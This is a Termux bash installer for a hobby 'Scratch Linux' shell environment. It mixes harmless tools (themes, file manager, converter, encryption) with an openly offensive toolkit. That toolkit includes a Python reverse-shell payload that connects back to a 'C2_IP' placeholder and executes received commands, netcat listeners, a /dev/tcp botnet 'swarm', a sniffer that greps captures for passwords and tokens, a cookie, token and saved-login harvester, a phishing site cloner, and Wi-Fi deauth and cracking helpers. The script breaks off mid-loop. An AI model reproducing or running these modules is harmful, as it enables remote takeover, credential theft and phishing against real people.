cat > ~/scratch.sh << 'ENDSCRIPT'
#!/data/data/com.termux/files/usr/bin/bash
# ═══════════════════════════════════════════════════════════════════
#  SCRATCH LINUX — Termux OS + Full Suite
#  GitHub: github.com/vovka216/scratch-os
#  License: MIT
# ═══════════════════════════════════════════════════════════════════

set -e
clear

SC="$HOME/.scratch"
if [ -d "$SC" ]; then
    echo "[!] Scratch Linux already installed"
    echo "    Run: source ~/.scratch/.bashrc"
    exit 0
fi

mkdir -p "$SC"/{bin,etc,var,tmp,root,log,plugins,packages,store,backup,cloud,cache,recover,stego,osint,scan_results,sniff,payloads,deanon,c2,vault,swarm,exploit,phish,wifi_crack,dox,cryptor,dns_spoof,caller,storm,anon,pentest,osint_data} 2>/dev/null
mkdir -p "$HOME/.tmp" 2>/dev/null

echo ""
echo "╔══════════════════════════════════════════════╗"
echo "║       SCRATCH LINUX — INSTALLING...          ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

echo "root:x:0:0:root:/root:/bin/bash" > "$SC/etc/passwd"
echo "root:x:0:" > "$SC/etc/group"
echo "localscratch" > "$SC/etc/hostname"
cat > "$SC/etc/os-release" << 'EOF'
NAME="Scratch Linux"
ID=scratch
PRETTY_NAME="Scratch Linux"
HOME_URL="https://github.com/vovka216/scratch-os"
EOF

cat > "$SC/bin/scratchfetch" << 'FETCH'
#!/data/data/com.termux/files/usr/bin/bash
R="\e[0m";C="\e[38;5;51m";Y="\e[38;5;220m"
CPU_M=$(grep "model name" /proc/cpuinfo 2>/dev/null|head -1|cut -d: -f2|xargs);[ -z "$CPU_M" ]&&CPU_M="ARM"
CPU_N=$(grep -c processor /proc/cpuinfo 2>/dev/null);[ -z "$CPU_N" ]&&CPU_N=8
MEM_T=$(free -m 2>/dev/null|grep Mem|awk '{print $2}');[ -z "$MEM_T" ]&&MEM_T=7665
MEM_U=$(free -m 2>/dev/null|grep Mem|awk '{print $3}');[ -z "$MEM_U" ]&&MEM_U=5093
UP=$(uptime 2>/dev/null|sed -E 's/.*up +//'|sed -E 's/, +[0-9]+ user.*//');[ -z "$UP" ]&&UP="?"
DEV=$(getprop ro.product.model 2>/dev/null||echo "Unknown")
KERN=$(uname -r 2>/dev/null||echo "?");ARCH=$(uname -m 2>/dev/null||echo "aarch64")
PKG_COUNT=$(ls /data/data/com.termux/files/usr/var/lib/dpkg/info/*.list 2>/dev/null|wc -l)
echo ""
echo -e "        ${C}    .--."
echo -e "        ${C}   |o_o |"
echo -e "        ${C}   |:_/ |"
echo -e "        ${C}  //   \\ \\"
echo -e "        ${C} (|     | )"
echo -e "        ${C}/'\\_   _/'\\"
echo -e "        ${C}\\___)=(___/"
echo -e "        ${C} SCRATCH"
echo -e "        ${C} LINUX"
echo ""
echo -e "        ${Y}════════ SCRATCH LINUX ════════"
echo -e "${R}"
echo "  OS:        Scratch Linux $ARCH"
echo "  Host:      $DEV"
echo "  Kernel:    $KERN"
echo "  Uptime:    $UP"
echo "  CPU:       $CPU_M ($CPU_N)"
echo "  Memory:    ${MEM_U}MiB / ${MEM_T}MiB"
echo "  Packages:  $PKG_COUNT"
echo "  User:      root@localscratch"
echo ""
FETCH
chmod +x "$SC/bin/scratchfetch"

echo '#!/data/data/com.termux/files/usr/bin/bash
export USER="root";exec bash' > "$SC/bin/su";chmod +x "$SC/bin/su"
echo '#!/data/data/com.termux/files/usr/bin/bash
"$@"' > "$SC/bin/sudo";chmod +x "$SC/bin/sudo"
echo '#!/data/data/com.termux/files/usr/bin/bash
echo "uid=0(root) gid=0(root) groups=0(root)"' > "$SC/bin/id";chmod +x "$SC/bin/id"
echo '#!/data/data/com.termux/files/usr/bin/bash
echo "root"' > "$SC/bin/whoami";chmod +x "$SC/bin/whoami"
echo '#!/data/data/com.termux/files/usr/bin/bash
echo "localscratch"' > "$SC/bin/hostname";chmod +x "$SC/bin/hostname"
echo '#!/data/data/com.termux/files/usr/bin/bash
echo "Linux localscratch aarch64 Scratch Linux"' > "$SC/bin/uname";chmod +x "$SC/bin/uname"
echo '#!/data/data/com.termux/files/usr/bin/bash
printf "\033[2J\033[H"' > "$SC/bin/clear";chmod +x "$SC/bin/clear"
echo '#!/data/data/com.termux/files/usr/bin/bash
/data/data/com.termux/files/usr/bin/pkg "$@"' > "$SC/bin/pkg";chmod +x "$SC/bin/pkg"
ln -sf "$SC/bin/scratchfetch" "$SC/bin/neofetch" 2>/dev/null

cat > "$SC/bin/spm" << 'SPM'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in install)pkg install "$2" -y 2>/dev/null&&echo "[OK] $2 installed"||echo "[!] Failed";;
search)pkg search "$2" 2>/dev/null;;list)pkg list-installed 2>/dev/null;;update)pkg update -y;;
upgrade)pkg upgrade -y;;remove)pkg uninstall "$2" -y;;*)echo "spm install|search|list|update|upgrade|remove";;esac
SPM
chmod +x "$SC/bin/spm"

cat > "$SC/bin/scratch-theme" << 'THEME'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in dark)P='\[\e[38;5;240m\]root@localscratch\[\e[0m\]:\[\e[34m\]\w\[\e[0m\]# ';;
hacker)P='\[\e[32m\]root@localscratch\[\e[0m\]:\[\e[32m\]\w\[\e[0m\]# ';;
ocean)P='\[\e[38;5;39m\]root@localscratch\[\e[0m\]:\[\e[38;5;51m\]\w\[\e[0m\]# ';;
sunset)P='\[\e[38;5;208m\]root@localscratch\[\e[0m\]:\[\e[38;5;214m\]\w\[\e[0m\]# ';;
rainbow)P='\[\e[38;5;196m\]r\[\e[38;5;202m\]o\[\e[38;5;208m\]o\[\e[38;5;214m\]t\[\e[38;5;220m\]@\[\e[38;5;226m\]l\[\e[38;5;190m\]o\[\e[38;5;154m\]c\[\e[38;5;118m\]a\[\e[38;5;82m\]l\[\e[38;5;46m\]s\[\e[38;5;47m\]c\[\e[38;5;48m\]r\[\e[38;5;49m\]a\[\e[38;5;50m\]t\[\e[38;5;51m\]c\[\e[38;5;45m\]h\[\e[0m\]:\[\e[34m\]\w\[\e[0m\]# ';;
*)echo "dark|hacker|ocean|sunset|rainbow";exit 0;;esac
echo "export PS1='$P'"
THEME
chmod +x "$SC/bin/scratch-theme"

cat > "$SC/bin/scratch-fm" << 'FM'
#!/data/data/com.termux/files/usr/bin/bash
D="${1:-$(pwd)}";cd "$D" 2>/dev/null||D=$(pwd)
while true;do clear;echo "FILE MANAGER: $(pwd)";echo "[q]Quit [..]Up [c]Create [d]Delete [e]Edit [v]View";echo ""
ls -1A 2>/dev/null|nl -w2 -s'. ';echo -n "> ";read c
case "$c" in q)break;;..)cd ..;;c)echo -n "Name: ";read n;[ -n "$n" ]&&touch "$n";;
d)echo -n "Num: ";read n;f=$(ls -1A|sed -n "${n}p");[ -n "$f" ]&&rm -rf "$f";;
e)echo -n "Num: ";read n;f=$(ls -1A|sed -n "${n}p");[ -f "$f" ]&&nano "$f" 2>/dev/null||vi "$f" 2>/dev/null;;
v)echo -n "Num: ";read n;f=$(ls -1A|sed -n "${n}p");[ -f "$f" ]&&head -50 "$f";echo -n "Enter...";read;;
*)f=$(ls -1A|sed -n "${c}p");[ -d "$f" ]&&cd "$f"||[ -f "$f" ]&&{ head -50 "$f";read; };;esac;done
FM
chmod +x "$SC/bin/scratch-fm"

cat > "$SC/bin/scratch-browser" << 'BROWSER'
#!/data/data/com.termux/files/usr/bin/bash
U="${1}";[ -z "$U" ]&&{ echo "browser <url> g gh yt w h r";exit;}
case "$U" in g)U="google.com";;gh)U="github.com";;yt)U="lite.youtube.com";;w)U="en.m.wikipedia.org";;h)U="news.ycombinator.com";;r)U="old.reddit.com";;esac
[[ "$U" != http* ]]&&U="https://$U";echo "Loading $U..."
w3m "$U" 2>/dev/null||lynx "$U" 2>/dev/null||links "$U" 2>/dev/null||curl -sL "$U"|sed 's/<[^>]*>//g'|fold -s -w 80|head -80
BROWSER
chmod +x "$SC/bin/scratch-browser"

cat > "$SC/bin/scratch-convert" << 'CONVERT'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in calc)echo "$2 = $(echo "$2"|bc 2>/dev/null)";;hex)printf "%d = 0x%x\n" "$2" "$2";;
*)[ $# -ge 3 ]&&{ case "$2-$3" in usd-rub)echo "$1 USD = $(echo "$1*90"|bc) RUB";;rub-usd)echo "$1 RUB = $(echo "scale=2;$1/90"|bc) USD";;
mb-kb)echo "$1 MB = $(($1*1024)) KB";;gb-mb)echo "$1 GB = $(($1*1024)) MB";;c-f)echo "$1 C = $(echo "scale=1;$1*9/5+32"|bc) F";;
f-c)echo "$1 F = $(echo "scale=1;($1-32)*5/9"|bc) C";;kg-lbs)echo "$1 kg = $(echo "scale=2;$1*2.205"|bc) lbs";;
km-miles)echo "$1 km = $(echo "scale=2;$1*0.621"|bc) miles";;*)echo "[!] Unknown: $2 -> $3";;esac };;esac
CONVERT
chmod +x "$SC/bin/scratch-convert"

cat > "$SC/bin/scratch-encrypt" << 'ENCRYPT'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in encrypt)echo -n "Password: ";read -s p;echo
openssl enc -aes-256-cbc -pbkdf2 -salt -in "$2" -out "${2}.scratch" -pass pass:"$p" 2>/dev/null&&echo "[OK] ${2}.scratch"||echo "[!] Failed";;
decrypt)echo -n "Password: ";read -s p;echo
openssl enc -d -aes-256-cbc -pbkdf2 -in "$2" -out "${2%.scratch}" -pass pass:"$p" 2>/dev/null&&echo "[OK] ${2%.scratch}"||echo "[!] Wrong password";;
hash)echo "MD5: $(md5sum "$2"|cut -d' ' -f1)";echo "SHA256: $(sha256sum "$2"|cut -d' ' -f1)";;*)echo "encrypt|decrypt|hash <file>";;esac
ENCRYPT
chmod +x "$SC/bin/scratch-encrypt"

cat > "$SC/bin/scratch-cloud" << 'CLOUD'
#!/data/data/com.termux/files/usr/bin/bash
CD="$HOME/.scratch/cloud";mkdir -p "$CD"
case "$1" in upload)cp "$2" "$CD/" 2>/dev/null&&echo "[OK] $2"||echo "[!] Not found";;
download)cp "$CD/$2" ./ 2>/dev/null&&echo "[OK] $2"||echo "[!] Not found";;
list)ls -lah "$CD/"|grep -v "^total"|awk '{print "  "$5"  "$9}';;delete)rm -f "$CD/$2"&&echo "[OK] Deleted";;
*)echo "upload|download|list|delete";;esac
CLOUD
chmod +x "$SC/bin/scratch-cloud"

cat > "$SC/bin/scratch-backup" << 'BACKUP'
#!/data/data/com.termux/files/usr/bin/bash
BD="$HOME/.scratch/backup";mkdir -p "$BD"
case "$1" in create)F="$BD/b_$(date +%Y%m%d_%H%M%S).tar.gz";tar -czf "$F" -C "$HOME/.scratch" . 2>/dev/null;echo "[OK] $F";;
list)ls -lah "$BD/"|grep -v "^total"|awk '{print "  "$5" "$6" "$7" "$9}';;
*)echo "create|list";;esac
BACKUP
chmod +x "$SC/bin/scratch-backup"

cat > "$SC/bin/scratch-plugin" << 'PLUGIN'
#!/data/data/com.termux/files/usr/bin/bash
PD="$HOME/.scratch/plugins";mkdir -p "$PD"
case "$1" in install)case "$2" in matrix)echo '#!/data/data/com.termux/files/usr/bin/bash
tput civis;trap "tput cnorm;exit" INT TERM;c="01";cols=$(tput cols);lines=$(tput lines)
for((i=0;i<cols;i++));do d[$i]=$((RANDOM%lines));done
while true;do for((i=0;i<cols;i++));do r=$((RANDOM%2))
echo -ne "\e[${d[$i]};${i}H\e[32m${c:$r:1}\e[0m"
d[$i]=$((${d[$i]}+1));[ ${d[$i]} -ge $lines ]&&d[$i]=0;done;sleep 0.05;done'>"$PD/matrix.sh";chmod +x "$PD/matrix.sh";echo "[OK] matrix installed";;
*)echo "[!] Unknown";;esac;;list)ls "$PD/" 2>/dev/null|sed 's/.sh$//';;
run)[ -f "$PD/$2.sh" ]&&bash "$PD/$2.sh"||echo "[!] Not found";;*)echo "install|list|run <name>";;esac
PLUGIN
chmod +x "$SC/bin/scratch-plugin"

cat > "$SC/bin/scratch-store" << 'STORE'
#!/data/data/com.termux/files/usr/bin/bash
while true;do clear
echo "╔══════════════════════════════════════════════╗"
echo "║  STORE  1.Firefox 2.VLC 3.Nmap 4.Htop       ║"
echo "║  5.Metasploit 6.John 7.SQLMap 8.Neovim      ║"
echo "║  9.Hydra 10.Aircrack 11.Nikto 12.Tcpdump    ║"
echo "║  [q]Quit                                     ║"
echo "╚══════════════════════════════════════════════╝"
echo -n "> ";read c
case "$c" in q)break;;1)pkg install firefox -y;;2)pkg install vlc -y;;3)pkg install nmap -y;;
4)pkg install htop -y;;5)pkg install metasploit -y;;6)pkg install john -y;;7)pkg install sqlmap -y;;
8)pkg install neovim -y;;9)pkg install hydra -y;;10)pkg install aircrack-ng -y;;
11)pkg install nikto -y;;12)pkg install tcpdump -y;;esac;done
STORE
chmod +x "$SC/bin/scratch-store"

cat > "$SC/bin/matrix" << 'MATRIX'
#!/data/data/com.termux/files/usr/bin/bash
tput civis;trap "tput cnorm;exit" INT TERM;c="01";cols=$(tput cols);lines=$(tput lines)
for((i=0;i<cols;i++));do d[$i]=$((RANDOM%lines));done
while true;do for((i=0;i<cols;i++));do r=$((RANDOM%2));echo -ne "\e[${d[$i]};${i}H\e[32m${c:$r:1}\e[0m"
d[$i]=$((${d[$i]}+1));[ ${d[$i]} -ge $lines ]&&d[$i]=0;done;sleep 0.05;done
MATRIX
chmod +x "$SC/bin/matrix"

cat > "$SC/bin/hack" << 'HACK'
#!/data/data/com.termux/files/usr/bin/bash
t=("INITIALIZING..." "BYPASSING FIREWALL..." "DECRYPTING PACKETS..." "ACCESSING MAINFRAME..." "DOWNLOADING DATABASE..." "ROOT ACCESS GRANTED" "CLEARING LOGS...")
for x in "${t[@]}";do for((i=0;i<${#x};i++));do echo -ne "\e[32m${x:$i:1}\e[0m";sleep 0.0$((RANDOM%3));done;echo "";sleep 0.2;done
echo -e "\e[32m[OK] COMPLETE\e[0m"
HACK
chmod +x "$SC/bin/hack"

cat > "$SC/bin/fortune" << 'FORTUNE'
#!/data/data/com.termux/files/usr/bin/bash
q=("Code is poetry." "Root is not a crime." "Hack the planet!" "Scratch Linux: Because stock is boring." "Talk is cheap. Show me the code." "In a world of 1s and 0s, be a 42.")
echo -e "\e[33m  ${q[$((RANDOM%${#q[@]}))]}\e[0m"
FORTUNE
chmod +x "$SC/bin/fortune"

cat > "$SC/bin/sysinfo" << 'SYSINFO'
#!/data/data/com.termux/files/usr/bin/bash
echo "CPU: $(grep "model name" /proc/cpuinfo 2>/dev/null|head -1|cut -d: -f2|xargs||echo ARM)"
echo "Cores: $(grep -c processor /proc/cpuinfo 2>/dev/null||echo 8)"
echo "RAM: $(free -h 2>/dev/null|grep Mem|awk '{print $3"/"$2}'||echo '?')"
echo "Disk: $(df -h / 2>/dev/null|tail -1|awk '{print $3"/"$2}'||echo '?')"
echo "Battery: $(termux-battery-status 2>/dev/null|grep percentage|cut -d: -f2|xargs||echo '?')%"
SYSINFO
chmod +x "$SC/bin/sysinfo"

# ARSENAL
cat > "$SC/bin/scratch-scan" << 'SCAN'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in quick)echo "[*] Quick scan $2...";for p in 21 22 23 25 53 80 110 143 443 445 993 995 3306 3389 5900 8080 8443;do
(timeout 1 bash -c "echo >/dev/tcp/$2/$p" 2>/dev/null&&echo "  $p: OPEN")&done;wait;echo "[OK]";;
stealth)nmap -sS -Pn -T2 "$2" 2>/dev/null||echo "[!] Install: spm install nmap";;
full)nmap -p- -T4 "$2" 2>/dev/null||echo "[!] Install: spm install nmap";;
service)nmap -sV "$2" 2>/dev/null||echo "[!] Install: spm install nmap";;
*)echo "scan quick|stealth|full|service <target>";;esac
SCAN
chmod +x "$SC/bin/scratch-scan"

cat > "$SC/bin/scratch-osint" << 'OSINT'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in nick)[ -z "$2" ]&&{ echo "Usage: osint nick <username>";exit 1;};echo "[*] Searching $2..."
for s in "github.com/$2" "twitter.com/$2" "instagram.com/$2" "reddit.com/user/$2" "t.me/$2";do
code=$(curl -s -o /dev/null -w "%{http_code}" "https://$s" 2>/dev/null)
[ "$code" = "200" ]&&echo "  [OK] https://$s"||echo "  [--] https://$s";done;;
ip)curl -s "http://ip-api.com/json/$2"|python3 -c "import sys,json;d=json.load(sys.stdin);print(f\"Country: {d.get('country','?')} City: {d.get('city','?')} ISP: {d.get('isp','?')}\")";;
*)echo "osint nick|ip <target>";;esac
OSINT
chmod +x "$SC/bin/scratch-osint"

cat > "$SC/bin/scratch-deanon" << 'DEANON'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in ip)curl -s "http://ip-api.com/json/$2"|python3 -c "import sys,json;d=json.load(sys.stdin);print(f\"IP: {d.get('query','?')}\nCountry: {d.get('country','?')}\nCity: {d.get('city','?')}\nISP: {d.get('isp','?')}\")";;
domain)whois "$2" 2>/dev/null|grep -E "Registrar|Creation|Expiry|Name Server"|head -8;;
*)echo "deanon ip|domain <target>";;esac
DEANON
chmod +x "$SC/bin/scratch-deanon"

cat > "$SC/bin/scratch-stego" << 'STEGO'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in hide)[ -z "$2" ]||[ -z "$3" ]&&{ echo "Usage: stego hide <secret> <cover>";exit 1;}
cat "$3" "$2" > "${4:-hidden.png}" 2>/dev/null;echo "[OK] ${4:-hidden.png}";;
extract)strings "$2"|tail -50;echo "Also try: binwalk -e $2";;
detect)echo "Type: $(file "$2")";echo "Size: $(wc -c <"$2") bytes";;
*)echo "stego hide|extract|detect";;esac
STEGO
chmod +x "$SC/bin/scratch-stego"

cat > "$SC/bin/scratch-sniff" << 'SNIFF'
#!/data/data/com.termux/files/usr/bin/bash
SD="$HOME/.scratch/sniff";mkdir -p "$SD"
case "$1" in start)IFACE="${2:-wlan0}";tcpdump -i "$IFACE" -w "$SD/cap_$(date +%H%M%S).pcap" 2>/dev/null&
echo $!>"$SD/sniff.pid";echo "[OK] Sniffing PID: $(cat $SD/sniff.pid)";;
stop)[ -f "$SD/sniff.pid" ]&&kill $(cat "$SD/sniff.pid") 2>/dev/null;rm -f "$SD/sniff.pid";echo "[OK] Stopped";;
passwords)tcpdump -r "$SD/"*.pcap -A 2>/dev/null|grep -iE "password|passwd|login|user|email|token|key"|head -20;;
status)[ -f "$SD/sniff.pid" ]&&echo "[*] Active"||echo "[*] Inactive";;
*)echo "sniff start|stop|passwords|status";;esac
SNIFF
chmod +x "$SC/bin/scratch-sniff"

cat > "$SC/bin/scratch-recover" << 'RECOVER'
#!/data/data/com.termux/files/usr/bin/bash
RD="$HOME/.scratch/recover";mkdir -p "$RD"/{photos,videos}
case "$1" in photo)find /sdcard -name "*.jpg" -o -name "*.png" -o -name "*.jpeg" 2>/dev/null|while read f;do cp "$f" "$RD/photos/" 2>/dev/null;done
echo "[OK] $(ls $RD/photos/ 2>/dev/null|wc -l) photos";;
video)find /sdcard -name "*.mp4" -o -name "*.avi" -o -name "*.mkv" 2>/dev/null|while read f;do cp "$f" "$RD/videos/" 2>/dev/null;done
echo "[OK] Done";;*)echo "recover photo|video";;esac
RECOVER
chmod +x "$SC/bin/scratch-recover"

cat > "$SC/bin/scratch-spoof" << 'SPOOF'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in mac)echo "New MAC: 00:$(openssl rand -hex 5|sed 's/\(..\)/\1:/g;s/:$//')";;
ip)echo "Current IP: $(curl -s ifconfig.me 2>/dev/null||echo '?')";;
gps)echo "GPS: ${2:-55.7558}, ${3:-37.6173}";;
device)M=("SM-G998B" "Pixel 7 Pro" "OnePlus 11" "Xiaomi 13" "Redmi Note 12");echo "Model: ${M[$((RANDOM%5))]}";;
*)echo "mac|ip|gps|device";;esac
SPOOF
chmod +x "$SC/bin/scratch-spoof"

cat > "$SC/bin/scratch-antidetect" << 'ANTIDETECT'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in on)export PS1='$ ';clear;echo "[OK] Stealth ON";;
off)source "$HOME/.scratch/.bashrc" 2>/dev/null;echo "[OK] Scratch restored";;
*)echo "on|off";;esac
ANTIDETECT
chmod +x "$SC/bin/scratch-antidetect"

cat > "$SC/bin/scratch-pentest" << 'PENTEST'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: pentest <target>";exit 1;}
T="$1";R="$HOME/.scratch/scan_results/p_$(date +%Y%m%d_%H%M%S)";mkdir -p "$R"
echo "[Phase 1/4] Recon...";whois "$T">"$R/whois.txt" 2>/dev/null&dig ANY "$T">"$R/dns.txt" 2>/dev/null&wait;echo "[OK]"
echo "[Phase 2/4] Scan...";nmap -F -sV "$T" -oN "$R/nmap.txt" 2>/dev/null||echo "Nmap missing">"$R/nmap.txt";echo "[OK]"
echo "[Phase 3/4] Web...";curl -sI "https://$T">"$R/headers.txt" 2>/dev/null;echo "[OK]"
echo "[Phase 4/4] Report: $R/";echo "[OK] Done"
PENTEST
chmod +x "$SC/bin/scratch-pentest"

cat > "$SC/bin/scratch-hack" << 'HACKMOD'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in wifi)echo "WiFi: aircrack-ng, reaver, hcxtools";;
web)echo "Web: sqlmap, nikto, dirb, ffuf";;android)echo "Android: apktool, jadx, dex2jar";;
all)echo "WiFi + Web + Android loaded";;*)echo "hack wifi|web|android|all";;esac
HACKMOD
chmod +x "$SC/bin/scratch-hack"

# PRO
cat > "$SC/bin/scratch-obfuscate" << 'OBF'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: obfuscate <file>";exit 1;};[ ! -f "$1" ]&&{ echo "[!] File not found";exit 1;}
echo "[*] Obfuscating $1...";cat "$1"|base64>"${1}.b64";KEY=$((RANDOM%255))
python3 -c "d=open('$1','rb').read();open('${1}.xor','wb').write(bytes([b^$KEY for b in d]))" 2>/dev/null
gzip -c "$1"|base64>"${1}.gz.b64";mkdir -p "${1}_chunks";split -b 512 "$1" "${1}_chunks/chunk_"
echo "[OK] Done: .b64 .xor .gz.b64 chunks/"
OBF
chmod +x "$SC/bin/scratch-obfuscate"

cat > "$SC/bin/scratch-hijack" << 'HIJ'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in cookies)find /data/data -name "cookies*" 2>/dev/null|grep -v cache|head -20;;
tokens)find /data/data -name "*.db" 2>/dev/null|while read f;do strings "$f" 2>/dev/null|grep -iE "token|session|auth|bearer"|head -3;done;;
saved)find /data/data -name "Login Data" -o -name "webdata*" 2>/dev/null|head -10;;
*)echo "hijack cookies|tokens|saved";;esac
HIJ
chmod +x "$SC/bin/scratch-hijack"

cat > "$SC/bin/scratch-c2" << 'C2'
#!/data/data/com.termux/files/usr/bin/bash
C2DIR="$HOME/.scratch/c2";mkdir -p "$C2DIR/clients"
case "$1" in start)PORT="${2:-4444}";echo "[*] C2 on port $PORT";nc -lvnp "$PORT";;
payload)cat > "$C2DIR/payload.py" << 'PYPAY'
#!/usr/bin/env python3
import socket,subprocess,time
H="C2_IP";P=4444
while True:
 try:s=socket.socket();s.connect((H,P))
  while True:c=s.recv(1024).decode()
   if c=="exit":break
   r=subprocess.getoutput(c);s.send(r.encode())
  s.close()
 except:time.sleep(10)
PYPAY
echo "[OK] $C2DIR/payload.py";;
*)echo "c2 start [port] | payload";;esac
C2
chmod +x "$SC/bin/scratch-c2"

cat > "$SC/bin/scratch-anon" << 'ANON'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in start)pkg install tor torsocks -y 2>/dev/null;tor & sleep 3;echo "[OK] Tor active. Use: torsocks <cmd>";;
stop)pkill tor;echo "[OK] Stopped";;
status)echo -n "Direct IP: ";curl -s ifconfig.me 2>/dev/null||echo "?"
echo -n "Tor IP: ";torsocks curl -s ifconfig.me 2>/dev/null||echo "?";;
change)pkill -HUP tor 2>/dev/null;sleep 2;echo -n "New IP: ";torsocks curl -s ifconfig.me 2>/dev/null||echo "?";;
*)echo "anon start|stop|status|change";;esac
ANON
chmod +x "$SC/bin/scratch-anon"

cat > "$SC/bin/scratch-root" << 'ROOT'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in check)echo "Device: $(getprop ro.product.model)";echo "Android: $(getprop ro.build.version.release)"
echo "Kernel: $(uname -r)";echo "SELinux: $(getenforce 2>/dev/null||echo '?')";;
su)export USER="root";export PS1='\[\e[31m\]root@localscratch\[\e[0m\]:\[\e[34m\]\w\[\e[0m\]# ';exec bash;;
*)echo "root check | su";;esac
ROOT
chmod +x "$SC/bin/scratch-root"

cat > "$SC/bin/scratch-vault-max" << 'VAULTMAX'
#!/data/data/com.termux/files/usr/bin/bash
TMPD="$HOME/.tmp/vault_$$";rm -rf "$TMPD" 2>/dev/null;mkdir -p "$TMPD"
encrypt_max(){ F="$1";[ ! -f "$F" ]&&{ echo "[!] File not found";exit 1;}
echo -n "Password: ";read -s P;echo;echo -n "Confirm: ";read -s P2;echo;[ "$P" != "$P2" ]&&{ echo "[!] Mismatch";exit 1;}
echo "[*] AES-256-CBC (layer 1)...";openssl enc -aes-256-cbc -pbkdf2 -iter 2000000 -salt -in "$F" -out "$TMPD/1.enc" -pass pass:"$P"
echo "[*] AES-256-CBC (layer 2)...";openssl enc -aes-256-cbc -pbkdf2 -iter 2000000 -salt -in "$TMPD/1.enc" -out "$TMPD/2.enc" -pass pass:"$P"
echo "[*] AES-256-CBC (layer 3)...";openssl enc -aes-256-cbc -pbkdf2 -iter 2000000 -salt -in "$TMPD/2.enc" -out "$TMPD/3.enc" -pass pass:"$P"
echo "[*] Splitting...";V="${F}_vault";rm -rf "$V" 2>/dev/null;mkdir -p "$V";split -b 200 "$TMPD/3.enc" "$TMPD/chunk_"
echo "[*] Encrypting chunks...";for c in "$TMPD"/chunk_*;do [ -f "$c" ]||continue;BN=$(basename "$c");openssl enc -aes-256-cbc -pbkdf2 -iter 1000000 -salt -in "$c" -out "$V/${BN}.enc" -pass pass:"$P";done
echo "$P"|openssl enc -aes-256-cbc -pbkdf2 -salt -in - -out "$V/.meta" -pass pass:"$P";shred -u "$F" 2>/dev/null||rm -f "$F";rm -rf "$TMPD"
CNT=$(ls "$V"/chunk_*.enc 2>/dev/null|wc -l);echo "[OK] $V/ ($CNT chunks)";}
decrypt_max(){ D="$1";[ ! -d "$D" ]&&{ echo "[!] Not found: $D";exit 1;};echo -n "Password: ";read -s P;echo
openssl enc -d -aes-256-cbc -pbkdf2 -in "$D/.meta" -out "$TMPD/test";[ $? -ne 0 ]&&{ echo "[!] Wrong password";exit 1;}
echo "[*] Decrypting chunks...";for c in "$D"/chunk_*.enc;do [ -f "$c" ]||continue;BN=$(basename "${c%.enc}");openssl enc -d -aes-256-cbc -pbkdf2 -iter 1000000 -in "$c" -out "$TMPD/$BN" -pass pass:"$P";done
echo "[*] Merging...";cat "$TMPD"/chunk_* > "$TMPD/3.enc";echo "[*] AES-256-CBC (layer 3)...";openssl enc -d -aes-256-cbc -pbkdf2 -iter 2000000 -in "$TMPD/3.enc" -out "$TMPD/2.enc" -pass pass:"$P"
echo "[*] AES-256-CBC (layer 2)...";openssl enc -d -aes-256-cbc -pbkdf2 -iter 2000000 -in "$TMPD/2.enc" -out "$TMPD/1.enc" -pass pass:"$P"
echo "[*] AES-256-CBC (layer 1)...";BN=$(basename "$D"|sed 's/_vault$//');openssl enc -d -aes-256-cbc -pbkdf2 -iter 2000000 -in "$TMPD/1.enc" -out "$BN" -pass pass:"$P"
rm -rf "$TMPD";echo "[OK] Decrypted: $BN";}
case "$1" in encrypt)encrypt_max "$2";;decrypt)decrypt_max "$2";;*)echo "vault-max encrypt|decrypt <file>";;esac
VAULTMAX
chmod +x "$SC/bin/scratch-vault-max"

# ATTACK
for mod in swarm exploit phish wifi-crack dox cryptor dns-spoof caller storm; do
    case $mod in
        swarm) cat > "$SC/bin/scratch-swarm" << 'SWEOF'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in start)PORT="${2:-5555}";echo "[*] Swarm master on port $PORT";nc -lvnp "$PORT";;
join)echo "[*] Joining $2:$3";while true;do exec 3<>/dev/tcp/$2/${3:-5555} 2>/dev/null&&break;sleep 5;done;echo "[OK] Connected";;
*)echo "swarm start|join <ip> [port]";;esac
SWEOF
        ;;
        exploit) cat > "$SC/bin/scratch-exploit" << 'EXEOF'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in scan)nmap -sV --script vuln "$2" 2>/dev/null||echo "[!] Nmap required";echo "CVEs: CVE-2022-0847 CVE-2021-4034 CVE-2024-1086";;
search)curl -s "https://cve.circl.lu/api/cve/$2"|python3 -c "import sys,json;print(json.load(sys.stdin).get('summary','?'))" 2>/dev/null;;
*)echo "exploit scan <target> | search <CVE>";;esac
EXEOF
        ;;
        phish) cat > "$SC/bin/scratch-phish" << 'PHEOF'
#!/data/data/com.termux/files/usr/bin/bash
PD="$HOME/.scratch/phish";mkdir -p "$PD/sites"
case "$1" in clone)SITE=$(echo "$2"|md5sum|cut -c1-8);wget -q -k -p -nH --cut-dirs=2 -P "$PD/sites/$SITE" "$2" 2>/dev/null;echo "[OK] Cloned: $SITE";;
serve)cd "$PD/sites/$2"&&python3 -m http.server 8080 2>/dev/null&echo "[OK] http://localhost:8080";;
*)echo "phish clone <url> | serve <id>";;esac
PHEOF
        ;;
        wifi-crack) cat > "$SC/bin/scratch-wifi-crack" << 'WCEOF'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in wps)echo "[*] WPS: reaver -i wlan0mon -b $2 -vv";;
pmkid)echo "[*] PMKID: hcxdumptool -i wlan0mon -o cap.pcap";;
wordlist)[ -f "$2" ]&&aircrack-ng "$2" -w ~/rockyou.txt||echo "[!] File not found: $2";;
deauth)echo "[*] Deauth: aireplay-ng -0 0 -a $2 wlan0mon";;
*)echo "wifi-crack wps|pmkid|wordlist|deauth <target>";;esac
WCEOF
        ;;
